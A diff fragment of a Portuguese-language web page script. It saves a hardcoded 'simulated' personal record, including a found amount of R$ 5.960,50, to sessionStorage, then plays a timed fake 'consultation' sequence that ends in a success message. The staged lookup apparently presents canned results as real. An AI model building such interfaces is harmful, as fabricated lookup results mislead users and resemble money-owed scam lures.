+            nome: 'Silvio',
+            nomeCompleto: 'Silvio Santos Silva',
+            nascimento: '15/12/1975',
+            sexo: 'M',
+            renda: '2500.00',
+            nomeMae: 'Maria da Silva Santos',
+            estadoCivil: 'Solteiro(a)',
+            valorEncontrado: 'R$ 5.960,50',
+            // Dados adicionais para validação
+            endereco: {
+              cep: '01310-100',
+              rua: 'Avenida Paulista, 1578',
+              bairro: 'Bela Vista',
+              cidade: 'São Paulo',
+              estado: 'SP'
+            },
+            telefone: '(11) 99999-8888',
+            email: 'silvio.santos@email.com',
+            profissao: 'Comerciante'
+          };
+          
+          // Salvar dados simulados no sessionStorage
+          sessionStorage.setItem('userData', JSON.stringify(consultData));
+          console.log('💾 Dados simulados salvos no sessionStorage:', consultData);
+        } else {
+          console.log('✅ Mantendo dados reais existentes:', existingData);
+        }
+        
+        let currentStep = 0;
+
+        function nextStep() {
+          if (currentStep < consultSequence.length) {
+            const step = consultSequence[currentStep];
+            
+            // Atualizar texto e valor
+            loadingText.textContent = step.text;
+            valueDisplay.innerHTML = step.value;
+            
+            currentStep++;
+            
+            // Agendar próximo passo
+            setTimeout(nextStep, step.delay);
+          } else {
+            // Finalizar sequência
+            loadingSection.style.display = 'none';
+            buttonSection.style.display = 'block';
+            successMessage.style.display = 'block';
+            
+            // Confirmar que os dados ainda estão salvos
+            console.log('✅ Consulta finalizada. Dados no sessionStorage:', sessionStorage.getItem('userData'));
+          }
+        }
+
+        // Iniciar sequência
+        nextStep();
+      }
+
+      // Adicionar event listener ao botão do usuário
+      document.addEventListener('DOMContentLoaded', function() {
+        const userButton = document.querySelector('[aria-label="Perfil do usuário"]');
+        if (userButton) {
+          userButton.addEventListener('click', toggleDropdown);
+        }
+
+        // Fechar dropdown ao clicar fora
+        document.addEventListener('click', function(event) {
+          const dropdown = document.getElementById('user-dropdown');
+          const userButton = document.querySelector('[aria-label="Perfil do usuário"]');
+          
+          if (dropdown && userButton && 
+              !dropdown.contains(event.target) && 
+              !userButton.contains(event.target)) {
+            dropdown.classList.add('hidden');
+          }
+        });
+
+        // Iniciar sequência de consulta após 1 segundo
+        setTimeout(startConsultSequence, 1000);
+      });
+    </script>
+  
+</body></html>
